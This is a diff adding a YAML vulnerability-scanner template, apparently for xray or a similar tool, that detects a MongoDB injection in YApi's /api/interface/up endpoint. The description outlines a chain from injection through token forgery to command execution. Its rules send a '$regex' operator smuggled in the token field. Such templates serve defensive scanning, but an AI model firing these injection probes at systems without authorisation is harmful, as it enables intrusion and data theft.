@@ -1,0 +1,34 @@
+id: yapi-sql-inject
+
+info:
+  name: YApi 接口管理平台 up SQL注入漏洞
+  author: unknown
+  severity: high
+  verified: true
+  description: |
+    YApi 接口管理平台存在SQL注入漏洞，攻击者通过MongoDB注入获取到用户数据后，通过已知的AES密钥生成加密后的Token可以通过VM逃逸执行系统命令获取主机权限
+    app="YApi"
+  reference:
+    - http://wiki.peiqi.tech/wiki/webapp/YApi/YApi%20%E6%8E%A5%E5%8F%A3%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0%20up%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.html
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /api/interface/up
+      headers:
+        Content-Type: application/json
+      body: |
+        {"id": -1, "token": {"$regex": "^1cae15606ea4b223b01a"}}
+    expression: response.status == 200 && response.body.bcontains(b'"errcode":') &&  response.body.bcontains(b'400,')
+  r1:
+    request:
+      method: POST
+      path: /api/interface/up
+      headers:
+        Content-Type: application/json
+      body: |
+        {"id": -1, "token": {"$regex": "^1cae15606ea4b223b01b"}}
+    expression: response.status == 200 && response.body.bcontains(b'"errcode":') &&  response.body.bcontains(b'40011,')
+expression: r0() && r1()
+    
